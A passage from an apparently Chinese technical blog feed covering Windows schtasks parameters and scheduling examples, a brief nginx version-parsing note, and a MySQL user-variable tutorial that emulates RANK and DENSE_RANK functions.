<p><code>/m</code> month[,month…] 指定一年中的一个月。有效值是 JAN ～ DEC 和 * （每个月）。/m参数只对于 MONTHLY 计划有效。在使用 LASTDAY 修饰符时，这个参数是必需的。否则，它是可选的，默认值是 * （每个月）。</p>
<p><code>/i</code> InitialPageFileSize 指定任务启动之前计算机空闲多少分钟。键入一个1 ～ 999之间的整数。这个参数只对于 ONIDLE 计划有效，而且是必需的。</p>
<p><code>/st</code> StartTime  以HH:MM:SS24 小时格式指定时间。默认值是命令完成时的当前本地时间。/st参数只对于 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY 和 ONCE 计划有效。它只对于 ONCE 计划是必需的。</p>
<p><code>/sd</code> StartDate 以MM/DD/YYYY格式指定任务启动的日期。默认值是当前日期。/sd参数对于所有的计划有效，但只对于 ONCE 计划是必需的。</p>
<p><code>/ed</code> EndDate 指定任务计划运行的最后日期。此参数是可选的。它对于 ONCE、ONSTART、ONLOGON 或 ONIDLE 计划无效。默认情况下，计划没有结束日期。</p>
<p><code>/s</code> Computer 指定远程计算机的名称或 IP 地址（带有或者没有反斜杠）。默认值是本地计算机。</p>
<p><code>/u</code> [domain]user  使用特定用户帐户的权限运行命令。默认情况下，使用已登录到运行 SchTasks 的计算机上的用户的权限运行命令。</p>
<p><code>/p</code> password 指定在/u参数中指定的用户帐户的密码。如果使用/u参数，则需要该参数。</p>
<p><code>/ru</code> {[Domain]User|”System”} 使用指定用户帐户的权限运行任务。默认情况下，使用用户登录到运行 SchTasks 的计算机上的权限运行任务。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">值说明</span><br><span class="line"></span><br><span class="line">[domain\&#125;User?  指定用户帐户。 &quot;System&quot;或&quot;&quot; 指定操作系统使用的 NT Authority\System 帐户。</span><br></pre></td></tr></table></figure>

<p><code>/p</code> Password 指定用户帐户的密码，该用户帐户在/u参数中指定。如果在指定用户帐户的时候忽略了这个参数，SchTasks.exe 会提示您输入密码而且不显示键入的文本。使用 NT Authority\System 帐户权限运行的任务不需要密码，SchTasks.exe 也不会提示索要密码。</p>
<p><code>/?</code> 在命令提示符显示帮助。</p>
<h4 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h4><h5 id="计划任务每-20-分钟运行一次"><a href="#计划任务每-20-分钟运行一次" class="headerlink" title="计划任务每 20 分钟运行一次"></a>计划任务每 20 分钟运行一次</h5><p>下面的命令计划安全脚本 Sec.vbs 每 20 分钟运行一次。由于命令没有包含起始日期或时间，任务在命令完成 20 分钟后启动，此后每当系统运行它就每 20 分钟运行一次。请注意，安全脚本源文件位于远程计算机上，但任务在本地计算机上计划并执行。</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">schtasks /create /sc minute /mo <span class="number">20</span> /tn "Security scrīpt" /tr \\central\data\scrīpts\sec.vbs</span><br></pre></td></tr></table></figure>

<h5 id="计划命令在每小时过五分的时候运行"><a href="#计划命令在每小时过五分的时候运行" class="headerlink" title="计划命令在每小时过五分的时候运行"></a>计划命令在每小时过五分的时候运行</h5><p>下面的命令将计划 MyApp 程序从午夜过后五分钟起每小时运行一次。因为忽略了/mo参数，命令使用了小时计划的默认值，即每 (1) 小时。如果该命令在 12:05 A.M 之后生成，程序将在第二天才会运行。</p>
<blockquote>
<p>schtasks /create /sc hourly /st 00:05:00 /tn “My App” /tr c:\apps\myapp.exe</p>
</blockquote>
<p>计划命令每五小时运行一次</p>
<p>下面的命令计划 MyApp 程序从 2001 年 3 月的第一天起每五小时运行一次。它使用/mo参数来指定间隔时间，使用/sd参数来指定起始日期。由于命令没有指定起始时间，当前时间被用作起始时间。</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">schtasks /create /sc hourly /mo <span class="number">5</span> /sd <span class="number">03</span>/<span class="number">01</span>/<span class="number">2001</span> /tn "My App" /tr c:\apps\myapp.exe</span><br><span class="line"></span><br><span class="line">schtasks create daily</span><br></pre></td></tr></table></figure>

<h5 id="计划任务每天运行一次"><a href="#计划任务每天运行一次" class="headerlink" title="计划任务每天运行一次"></a>计划任务每天运行一次</h5><p>下面的范例计划 MyApp 程序在每天的 8:00 A.M. 运行一次，直到 2001 年 12 月 31 日结束。由于它忽略了/mo参数，所以使用默认间隔 1 来每天运行命令。</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc daily /st <span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span> /ed <span class="number">12</span>/<span class="number">31</span>/<span class="number">2001</span></span><br></pre></td></tr></table></figure>

<h5 id="计划任务每六周运行一次"><a href="#计划任务每六周运行一次" class="headerlink" title="计划任务每六周运行一次"></a>计划任务每六周运行一次</h5><p>下面的命令计划 MyApp 程序在远程计算机上每六周运行一次。该命令使用/mo参数来指定间隔。它也使用/s参数来指定远程计算机，使用/ru参数来计划任务以用户的 Administrator 帐户权限运行。因为忽略了/rp参数，SchTasks.exe 会提示用户输入 Administrator 帐户密码。</p>
<p>另外，因为命令是远程运行的，所以命令中所有的路径，包括到 MyApp.exe 的路径，都是指向远程计算机上的路径。</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc weekly /mo <span class="number">6</span> /s Server16 /ru Admin01</span><br></pre></td></tr></table></figure>

<h4 id="如何关闭dos窗口提示"><a href="#如何关闭dos窗口提示" class="headerlink" title="如何关闭dos窗口提示"></a>如何关闭dos窗口提示</h4><figure class="highlight vb"><table><tr><td class="code"><pre><span class="line">// 使用vbs 在后台静默执行</span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> ws = CreateObject(<span class="string">"Wscript.Shell"</span>)</span><br><span class="line"></span><br><span class="line">ws.run <span class="string">"cmd /c d:\wamp\www\code\queue\task"</span>,vbhide</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>nginx 解析异常</title>
    <url>/articles/nginx%20%E8%A7%A3%E6%9E%90%E5%BC%82%E5%B8%B8/</url>
    <content><![CDATA[<p><img src="/articles/nginx 解析异常/1.png" alt="nginx.conf"></p>
<p>上面的配置在  nginx/1.10.2   正常 ， 而在 nginx/1.9.10中会得到如下解析</p>
<p>aaa.com/api     错误</p>
<p>aaa.com/api/api 正常</p>
]]></content>
  </entry>
  <entry>
    <title>mysql中的用户变量</title>
    <url>/articles/mysql%E4%B8%AD%E7%9A%84%E7%94%A8%E6%88%B7%E5%8F%98%E9%87%8F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://leetcode-cn.com/problems/consecutive-numbers" target="_blank" rel="noopener">LeetCode</a>上有一道SQL练习题感觉很有必要备注一下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">【中等】180.编写一个 SQL 查询，查找所有至少连续出现三次的数字。</span><br><span class="line"></span><br><span class="line">+----+-----+</span><br><span class="line">| Id | Num |</span><br><span class="line">+----+-----+</span><br><span class="line">| 1  |  1  |</span><br><span class="line">| 2  |  1  |</span><br><span class="line">| 3  |  1  |</span><br><span class="line">| 4  |  2  |</span><br><span class="line">| 5  |  1  |</span><br><span class="line">| 6  |  2  |</span><br><span class="line">| 7  |  2  |</span><br><span class="line">+----+-----+</span><br><span class="line">例如，给定上面的 Logs 表， 1 是唯一连续出现至少三次的数字。</span><br><span class="line"></span><br><span class="line">+-----------------+</span><br><span class="line">| ConsecutiveNums |</span><br><span class="line">+-----------------+</span><br><span class="line">| 1               |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure>

<p>题解：</p>
<ul>
<li><a href="https://leetcode-cn.com/problems/consecutive-numbers/solution/lian-xu-chu-xian-de-shu-zi-by-leetcode/" target="_blank" rel="noopener">ID是连续的</a>：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    <span class="keyword">Logs</span> l1,</span><br><span class="line">    <span class="keyword">Logs</span> l2,</span><br><span class="line">    <span class="keyword">Logs</span> l3</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">    l1.Id = l2.Id - <span class="number">1</span></span><br><span class="line">    <span class="keyword">AND</span> l2.Id = l3.Id - <span class="number">1</span></span><br><span class="line">    <span class="keyword">AND</span> l1.Num = l2.Num</span><br><span class="line">    <span class="keyword">AND</span> l2.Num = l3.Num</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">利用了ID连续，前后ID相差1的特性来确定，缺点也很明显, 数据必须保证前后ID是连续的且不断裂的</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<ul>
<li><a href="https://leetcode-cn.com/problems/consecutive-numbers/comments/" target="_blank" rel="noopener">ID连续性不确定</a>：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span></span><br><span class="line">	<span class="keyword">Num</span> <span class="keyword">AS</span> ConsecutiveNums</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">	(</span><br><span class="line">		<span class="keyword">SELECT</span></span><br><span class="line">			<span class="keyword">Num</span>,</span><br><span class="line">			<span class="keyword">CASE</span></span><br><span class="line">		<span class="keyword">WHEN</span> @prev = <span class="keyword">Num</span> <span class="keyword">THEN</span></span><br><span class="line">			@<span class="keyword">count</span> := @<span class="keyword">count</span> + <span class="number">1</span></span><br><span class="line">		<span class="keyword">WHEN</span> (@prev := <span class="keyword">Num</span>) <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">THEN</span></span><br><span class="line">			@<span class="keyword">count</span> := <span class="number">1</span></span><br><span class="line">		<span class="keyword">END</span> <span class="keyword">AS</span> CNT</span><br><span class="line">		<span class="keyword">FROM</span></span><br><span class="line">			<span class="keyword">LOGS</span>,</span><br><span class="line">			(</span><br><span class="line">				<span class="keyword">SELECT</span></span><br><span class="line">					@prev := <span class="literal">NULL</span> ,@<span class="keyword">count</span> := <span class="literal">NULL</span></span><br><span class="line">			) <span class="keyword">AS</span> t</span><br><span class="line">	) <span class="keyword">AS</span> temp</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">	temp.CNT &gt;= <span class="number">3</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">利用用户变量实现对连续出现的值进行计数,与自关联或自连接相比，这种方法的效率更高，不受Logs表中的Id是否连续的限制，而且可以任意设定某个值连续出现的次数。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h2 id="MySQL的变量分类"><a href="#MySQL的变量分类" class="headerlink" title="MySQL的变量分类"></a>MySQL的变量分类</h2><p>MySQL变量一共分为两大类：用户自定义变量和系统变量。如下：</p>
<ul>
<li>用户自定义变量<ul>
<li>局部变量</li>
<li>会话变量</li>
</ul>
</li>
<li>系统变量<ul>
<li>会话变量</li>
<li>全局变量</li>
</ul>
</li>
</ul>
<h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>局部变量一般用于SQL的语句块中，比如存储过程中的begin和end语句块。其作用域仅限于该语句块内。生命周期也仅限于该存储过程的调用期间。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">procedure</span> <span class="keyword">if</span> <span class="keyword">exists</span> _procedure_test;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> _procedure_test</span><br><span class="line">(</span><br><span class="line">    <span class="keyword">in</span> a <span class="built_in">int</span>,</span><br><span class="line">    <span class="keyword">in</span> b <span class="built_in">int</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">declare</span> c <span class="built_in">int</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">set</span> c = a + b;</span><br><span class="line">    <span class="keyword">select</span> c <span class="keyword">as</span> c;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure>

<p>上述存储过程中定义的变量c就是局部变量。</p>
<h3 id="会话变量"><a href="#会话变量" class="headerlink" title="会话变量"></a>会话变量</h3><p>会话变量即为服务器为每个客户端连接维护的变量。在客户端连接时，使用相应全局变量的当前值对客户端的回话变量进行初始化。设置会话变量不需要特殊权限，但客户端只能更改自己的会话变量。其作用域与生命周期均限于当前客户端连接。</p>
<p>会话变量的赋值：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; set session var_name = value;</span><br><span class="line">mysql&gt; set @@session.var_name = value;</span><br><span class="line">mysql&gt; set var_name = value;</span><br></pre></td></tr></table></figure>

<p>会话变量的查询：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@var_name;</span><br><span class="line">mysql&gt; select @@session.var_name;</span><br><span class="line">mysql&gt; show session variables like "%var%";</span><br></pre></td></tr></table></figure>

<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>全局变量影响服务器整体操作。当服务器启动时，它将所有全局变量初始化为默认值。这些默认值可以在选项文件中或在命令行中指定的选项进行更改。要想更改全局变量，必须具有SUPER权限。全局变量作用于server的整个生命周期，但是不能跨重启。即重启后所有设置的全局变量均失效。要想让全局变量重启后继续生效，需要更改相应的配置文件。</p>
<p>全局变量的设置：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; set global var_name = value; //注意：此处的global不能省略。根据手册，set命令设置变量时若不指定GLOBAL、SESSION或者LOCAL，默认使用SESSION</span><br><span class="line">mysql&gt; set @@global.var_name = value; //同上</span><br></pre></td></tr></table></figure>

<p>全局变量的查询：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@global.var_name;</span><br><span class="line">mysql&gt; show global variables like "%var%";</span><br></pre></td></tr></table></figure>

<h2 id="自定义变量"><a href="#自定义变量" class="headerlink" title="自定义变量"></a>自定义变量</h2><p>你可以利用SQL语句将值存储在用户自定义变量中，然后再利用另一条SQL语句来查询用户自定义变量。这样以来，可以再不同的SQL间传递值。</p>
<p>用户自定义变量的声明方法形如：@var_name，其中变量名称由字母、数字、“.”、“_”和“$”组成。当然，在以字符串或者标识符引用时也可以包含其他字符（例如：@’my-var’，@”my-var”，或者@<code>my-var</code>）。</p>
<p><code>用户自定义变量是会话级别的变量</code>。其变量的作用域仅限于声明其的客户端链接。当这个客户端断开时，其所有的会话变量将会被释放。</p>
<p><code>用户自定义变量是不区分大小写的。</code></p>
<p>使用SET语句来声明用户自定义变量：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; SET @var_name = expr[, @var_name = expr] ...</span><br></pre></td></tr></table></figure>

<p>在使用SET设置变量时，可以使用 <code>=</code> 或者 <code>:=</code> 操作符进行赋值。</p>
<p>当然，除了SET语句还有其他赋值的方式。比如下面这个例子，但是赋值操作符只能使用 <code>:=</code> , 因为 <code>=</code> 操作符将会被认为是比较操作符。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; SET @t1 = 1, @t2 = 2, @t3 := 4;</span><br><span class="line">mysql&gt; SELECT @t1, @t2, @t3, @t4 := @t1 + @t2 + @t3;</span><br><span class="line">+<span class="comment">------+------+------+--------------------+</span></span><br><span class="line">| @t1  | @t2  | @t3  | @t4 := @t1+@t2+@t3 |</span><br><span class="line">+<span class="comment">------+------+------+--------------------+</span></span><br><span class="line">|    1 |    2 |    4 |                  7 |</span><br><span class="line">+<span class="comment">------+------+------+--------------------+</span></span><br></pre></td></tr></table></figure>

<p>用户变量的类型仅限于：<code>整形</code>、<code>浮点型</code>、<code>二进制</code>与<code>非二进制串</code>和<code>NULL</code>。在赋值浮点数时，系统不会保留精度。其他类型的值将会被转成相应的上述类型。比如：一个包含时间或者空间数据类型（temporal or spatial data type）的值将会转换成一个二进制串。</p>
<p>如果用户自定义变量的值以结果集形式返回，系统会将其转换成字符串形式。</p>
<p>如果查询一个没有初始化的变量，将会以字符串类型返回NULL。</p>
<p>不要在同一个非SET语句中同时赋值并使用同一个用户自定义变量</p>
<p>用户自定义变量可以用于很多上下文中。但是目前并不包括那些显式使用常量的表达式中，比如SELECT中的LIMIT子句，或者LOAD DATA中的IGNORE N LINES的字句中。</p>
<p>通常来说，除了在SET语句中，不要再同一个SQL语句中同时赋值并使用同一个用户自定义变量。举个变量自增的例子，下面的是没问题的：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; SET @a = @a + 1;</span><br></pre></td></tr></table></figure>

<p>对于其他语句，比如SELECT，也许会得到期望的效果，但这真心不靠谱。比如下面的语句，也许你自然地会认为MySQL会先执行@a的值，然后再进行赋值操作：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT @a, @a:=@a+1, ...;</span><br></pre></td></tr></table></figure>

<p>然而，用户自定义变量表达式的计算顺序还没有定义呢。</p>
<p>除此之外，还有另一个问题。<code>变量的默认返回类型由语句开始时的类型决定的</code>，正如下面的例子：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; SET @a='test';</span><br><span class="line">mysql&gt; SELECT @a,(@a:=20) FROM tbl_name;</span><br></pre></td></tr></table></figure>

<p>上述的SELECT语句中，MySQL会报告给客户端第一列的字段类型为字符串，同时将所有对@a变量的使用均转换为字符串处理，尽管在SELECT语句中将@a变量设置为数字类型。在SELECT语句执行后，@a变量才会在下一个语句中识别为数字类型。</p>
<p>为了避免上述问题的发生，要么不在同一个语句中同时赋值并使用变量，要么在使用之前，将变量设置为0，0.0，或者’’，以确定它的数据类型。</p>
<p><code>变量的值是在SQL发送到客户端后才计算的</code></p>
<p>在SELECT语句中，在每一个select表达式被发送给客户端后，才会进行计算。这就意味着，在形如HAVING，GROUP BY和ORDER BY只句中有使用在当前select表达式定义的变量的情况下，该语句将不会得到如期的效果。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT (@aa:=id) AS a, (@aa+3) AS b FROM tbl_name HAVING b=5;</span><br></pre></td></tr></table></figure>

<p>上述在HAVING只句中使用了在当前的select列表中定义的别名b，其使用了变量@aa。这条语句并不会得到如期的效果：@aa变量为上一次SQL语句执行的结果集中的ID值，并非当前的。</p>
<h2 id="例-在MySQL中实现Rank高级排名函数"><a href="#例-在MySQL中实现Rank高级排名函数" class="headerlink" title="例 : 在MySQL中实现Rank高级排名函数"></a>例 : 在MySQL中实现Rank高级排名函数</h2><p>除了上面题目中的示例，这里给出另外一个常用的示例：</p>
<p>MySQL中没有Rank排名函数，当我们需要查询排名时，我们可以利用自定义变量来达到Rank函数一样的高级排名效果。</p>
<p>首先我们先创建一个我们需要进行高级排名查询的players表，</p>
<table>
<thead>
<tr>
<th>pid</th>
<th>name</th>
<th>age</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Samual</td>
<td>25</td>
</tr>
<tr>
<td>2</td>
<td>Vino</td>
<td>20</td>
</tr>
<tr>
<td>3</td>
<td>John</td>
<td>20</td>
</tr>
<tr>
<td>4</td>
<td>Andy</td>
<td>22</td>
</tr>
<tr>
<td>5</td>
<td>Brian</td>
<td>21</td>
</tr>
<tr>
<td>6</td>
<td>Dew</td>
<td>24</td>
</tr>
<tr>
<td>7</td>
<td>Kris</td>
<td>25</td>
</tr>
<tr>
<td>8</td>
<td>William</td>
<td>26</td>
</tr>
<tr>
<td>9</td>
<td>George</td>
<td>23</td>
</tr>
<tr>
<td>10</td>
<td>Peter</td>
<td>19</td>
</tr>
<tr>
<td>11</td>
<td>Tom</td>
<td>20</td>
</tr>
<tr>
<td>12</td>
<td>Andre</td>
<td>20</td>
</tr>
</tbody></table>
<h3 id="实现Rank普通排名函数"><a href="#实现Rank普通排名函数" class="headerlink" title="实现Rank普通排名函数"></a>实现Rank普通排名函数</h3><p>在这里，我们希望获得一个排名字段的列，以及age的升序排列。所以我们的查询语句将是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> pid, <span class="keyword">name</span>, age, @curRank := @curRank + <span class="number">1</span> <span class="keyword">AS</span> <span class="keyword">rank</span></span><br><span class="line"><span class="keyword">FROM</span> players p, (<span class="keyword">SELECT</span> @curRank := <span class="number">0</span>) q</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> age</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>PID</th>
<th>NAME</th>
<th>AGE</th>
<th>RANK</th>
</tr>
</thead>
<tbody><tr>
<td>10</td>
<td>Peter</td>
<td>19</td>
<td>1</td>
</tr>
<tr>
<td>12</td>
<td>Andre</td>
<td>20</td>
<td>2</td>
</tr>
<tr>
<td>2</td>
<td>Vino</td>
<td>20</td>
<td>3</td>
</tr>
<tr>
<td>3</td>
<td>John</td>
<td>20</td>
<td>4</td>
</tr>
<tr>
<td>11</td>
<td>Tom</td>
<td>20</td>
<td>5</td>
</tr>
<tr>
<td>5</td>
<td>Brian</td>
<td>21</td>
<td>6</td>
</tr>
<tr>
<td>4</td>
<td>Andy</td>
<td>22</td>
<td>7</td>
</tr>
<tr>
<td>9</td>
<td>George</td>
<td>23</td>
<td>8</td>
</tr>
<tr>
<td>6</td>
<td>Dew</td>
<td>24</td>
<td>9</td>
</tr>
<tr>
<td>7</td>
<td>Kris</td>
<td>25</td>
<td>10</td>
</tr>
<tr>
<td>1</td>
<td>Samual</td>
<td>25</td>
<td>11</td>
</tr>
<tr>
<td>8</td>
<td>William</td>
<td>26</td>
<td>12</td>
</tr>
</tbody></table>
<p>要在mysql中声明一个变量，你必须在变量名之前使用@符号。FROM子句中的(@curRank := 0)部分允许我们进行变量初始化，而不需要单独的SET命令。当然，也可以使用SET，但它会处理两个查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> @curRank := <span class="number">0</span>;</span><br><span class="line"><span class="keyword">SELECT</span> pid, <span class="keyword">name</span>, age, @curRank := @curRank + <span class="number">1</span> <span class="keyword">AS</span> <span class="keyword">rank</span></span><br><span class="line"><span class="keyword">FROM</span> players</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> age</span><br></pre></td></tr></table></figure>

<h3 id="实现Rank查询以降序排列"><a href="#实现Rank查询以降序排列" class="headerlink" title="实现Rank查询以降序排列"></a>实现Rank查询以降序排列</h3><p>首要按age的降序排列，其次按name进行排列，只需修改查询语句加上ORDER BY和 DESC以及列名即可。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> pid, <span class="keyword">name</span>, age, @curRank := @curRank + <span class="number">1</span> <span class="keyword">AS</span> <span class="keyword">rank</span></span><br><span class="line"><span class="keyword">FROM</span> players p, (<span class="keyword">SELECT</span> @curRank := <span class="number">0</span>) q</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> age <span class="keyword">DESC</span>, <span class="keyword">name</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>PID</th>
<th>NAME</th>
<th>AGE</th>
<th>RANK</th>
</tr>
</thead>
<tbody><tr>
<td>8</td>
<td>William</td>
<td>26</td>
<td>1</td>
</tr>
<tr>
<td>7</td>
<td>Kris</td>
<td>25</td>
<td>2</td>
</tr>
<tr>
<td>1</td>
<td>Samual</td>
<td>25</td>
<td>3</td>
</tr>
<tr>
<td>6</td>
<td>Dew</td>
<td>24</td>
<td>4</td>
</tr>
<tr>
<td>9</td>
<td>George</td>
<td>23</td>
<td>5</td>
</tr>
<tr>
<td>4</td>
<td>Andy</td>
<td>22</td>
<td>6</td>
</tr>
<tr>
<td>5</td>
<td>Brian</td>
<td>21</td>
<td>7</td>
</tr>
<tr>
<td>12</td>
<td>Andre</td>
<td>20</td>
<td>8</td>
</tr>
<tr>
<td>3</td>
<td>John</td>
<td>20</td>
<td>9</td>
</tr>
<tr>
<td>11</td>
<td>Tom</td>
<td>20</td>
<td>10</td>
</tr>
<tr>
<td>2</td>
<td>Vino</td>
<td>20</td>
<td>11</td>
</tr>
<tr>
<td>10</td>
<td>Peter</td>
<td>19</td>
<td>12</td>
</tr>
</tbody></table>
<h3 id="实现Rank普通并列排名函数"><a href="#实现Rank普通并列排名函数" class="headerlink" title="实现Rank普通并列排名函数"></a>实现Rank普通并列排名函数</h3><p>现在，如果我们希望为并列数据的行赋予相同的排名，则意味着那些在排名比较列中具有相同值的行应在MySQL中计算排名时保持相同的排名(例如在我们的例子中的age)。为此，我们使用了一个额外的变量。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> pid, <span class="keyword">name</span>, age,</span><br><span class="line"><span class="keyword">CASE</span></span><br><span class="line"><span class="keyword">WHEN</span> @prevRank = age <span class="keyword">THEN</span> @curRank</span><br><span class="line"><span class="keyword">WHEN</span> @prevRank := age <span class="keyword">THEN</span> @curRank := @curRank + <span class="number">1</span></span><br><span class="line"><span class="keyword">END</span> <span class="keyword">AS</span> <span class="keyword">rank</span></span><br><span class="line"><span class="keyword">FROM</span> players p, (<span class="keyword">SELECT</span> @curRank :=<span class="number">0</span>, @prevRank := <span class="literal">NULL</span>) r</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> age</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>PID</th>
<th>NAME</th>
<th>AGE</th>
<th>RANK</th>
</tr>
</thead>
<tbody><tr>
<td>10</td>
<td>Peter</td>
<td>19</td>
<td>1</td>
</tr>
<tr>
<td>12</td>
<td>Andre</td>
<td>20</td>
<td>2</td>
</tr>
<tr>
<td>2</td>
<td>Vino</td>
<td>20</td>
<td>2</td>
</tr>
<tr>
<td>3</td>
<td>John</td>
<td>20</td>
<td>2</td>
</tr>
<tr>
<td>11</td>
<td>Tom</td>
<td>20</td>
<td>2</td>
</tr>
<tr>
<td>5</td>
<td>Brian</td>
<td>21</td>
<td>3</td>
</tr>
<tr>
<td>4</td>
<td>Andy</td>
<td>22</td>
<td>4</td>
</tr>
<tr>
<td>9</td>
<td>George</td>
<td>23</td>
<td>5</td>
</tr>
<tr>
<td>6</td>
<td>Dew</td>
<td>24</td>
<td>6</td>
</tr>
<tr>
<td>7</td>
<td>Kris</td>
<td>25</td>
<td>7</td>
</tr>
<tr>
<td>1</td>
<td>Samual</td>
<td>25</td>
<td>7</td>
</tr>
<tr>
<td>8</td>
<td>William</td>
<td>26</td>
<td>8</td>
</tr>
</tbody></table>
<p>如上所示，具有相同数据和排行的两行或多行，它们都会获得相同的排名。玩家Andre, Vino, John 和Tom都有相同的age，所以他们排名并列第二。下一个最高age的玩家(Brian)排名第3。这个查询相当于MSSQL和ORACLE 中的DENSE_RANK()函数。</p>
<h3 id="实现Rank高级并列排名函数"><a href="#实现Rank高级并列排名函数" class="headerlink" title="实现Rank高级并列排名函数"></a>实现Rank高级并列排名函数</h3><p>当使用RANK()函数时，如果两个或以上的行排名并列，则相同的行都会有相同的排名，但是实际排名中存在有关系的差距。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> pid, <span class="keyword">name</span>, age, <span class="keyword">rank</span> <span class="keyword">FROM</span></span><br><span class="line">(<span class="keyword">SELECT</span> pid, <span class="keyword">name</span>, age,</span><br><span class="line">    @curRank := <span class="keyword">IF</span>(@prevRank = age, @curRank, @incRank) <span class="keyword">AS</span> <span class="keyword">rank</span>,</span><br><span class="line">    @incRank := @incRank + <span class="number">1</span>,</span><br><span class="line">    @prevRank := age</span><br><span class="line">    <span class="keyword">FROM</span> players p, (<span class="keyword">SELECT</span> @curRank :=<span class="number">0</span>, @prevRank := <span class="literal">NULL</span>, @incRank := <span class="number">1</span>) r</span><br><span class="line">    <span class="keyword">ORDER</span> <span class="keyword">BY</span> age ) s</span><br></pre></td></tr></table></figure>

<p>这是一个查询中的子查询。我们使用三个变量(@incRank，@prevRank，@curRank)来计算关系的情况下，在查询结果中我们已经补全了因为并列而导致的排名空位。我们已经封闭子查询到查询。这个查询相当于MSSQL和ORACLE中的RANK()函数。</p>
<table>
<thead>
<tr>
<th>PID</th>
<th>NAME</th>
<th>AGE</th>
<th>RANK</th>
</tr>
</thead>
<tbody><tr>
<td>10</td>
<td>Peter</td>
<td>19</td>
<td>1</td>
</tr>
<tr>
<td>12</td>
<td>Andre</td>
<td>20</td>
<td>2</td>
</tr>
<tr>
<td>2</td>
<td>Vino</td>
<td>20</td>
<td>2</td>
</tr>
<tr>
<td>3</td>
<td>John</td>
<td>20</td>
<td>2</td>
</tr>
<tr>
<td>11</td>
<td>Tom</td>
<td>20</td>
<td>2</td>
</tr>
<tr>
<td>5</td>
<td>Brian</td>
<td>21</td>
<td>6</td>
</tr>
<tr>
<td>4</td>
<td>Andy</td>
<td>22</td>
<td>7</td>
</tr>
<tr>
<td>9</td>
<td>George</td>
<td>23</td>
<td>8</td>
</tr>
<tr>
<td>6</td>
<td>Dew</td>
<td>24</td>
<td>9</td>
</tr>
<tr>
<td>7</td>
<td>Kris</td>
<td>25</td>
<td>10</td>
</tr>
<tr>
<td>1</td>
<td>Samual</td>
<td>25</td>
<td>10</td>
</tr>
<tr>
<td>8</td>
<td>William</td>
<td>26</td>
<td>12</td>
</tr>
</tbody></table>
<p>在这里我们可以看到，Andre，Vino，John和Tom都有相同的age，所以他们排名并列第二。下一个最高年龄的球员(Brian)排名第6，而不是第3，因为有4个人并列排名在第2。</p>
<p>好的，通过本文加深对sql的运用，也希望你能从中获取收获。</p>
<p>参考链接:</p>
